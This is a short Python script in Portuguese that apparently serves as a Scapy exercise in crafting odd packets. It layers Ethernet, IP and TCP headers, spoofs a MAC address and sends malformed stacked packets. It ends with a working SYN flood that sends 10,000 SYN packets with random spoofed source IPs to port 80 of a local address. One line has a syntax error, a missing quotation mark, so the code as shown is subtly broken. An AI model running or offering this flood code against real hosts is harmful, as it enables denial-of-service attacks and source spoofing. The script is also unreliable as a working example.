# python gerando pacotes esquisitos


from scapy.all import *
Layer2 = Ether() # camada 2 de elace contendo informações como endereços MAC de origem e destino.
Layer2.show()
Layer3 = IP() # representa a Camada 3 (Rede), contendo informações como endereços IP de origem e destino.
Layer3.show()
MyIPv6 = IPv6()
MyIPv6.show()
Layer2.show()
Layer2=Ether(src=01:02:03:04:05:06") # redefinindo a camada ethernet com um mac spoofing
Layer2.show()
Layer3=IP(dst="192.168.1.249")
Layer3.show()
send=sendp(Layer2)
send=sendp(Layer2/Layer3)
send=sendp(Layer2/Layer3/Layer3) # Ethernet dentro de um cabeçalho IP. 
send=sendp(Layer2/Layer3/Layer3/Layer3)
send=sendp(Layer2/Layer3/Layer2)
Layer4 = TCP()
Layer4.show()
send=sendp(Layer2/Layer3/Layer4)


# Exemplo de SYN Flood básico (potencialmente malicioso)
# Envia muitos pacotes SYN com IP de origem falsificado
target_ip = "192.168.1.249"
for _ in range(10000): # Envia 10.000 pacotes
    spoofed_src_ip = RandIP() # Gera um IP de origem aleatório
    packet = Ether()/IP(src=spoofed_src_ip, dst=target_ip)/TCP(dport=80, flags="S")
    sendp(packet, verbose=0)

 
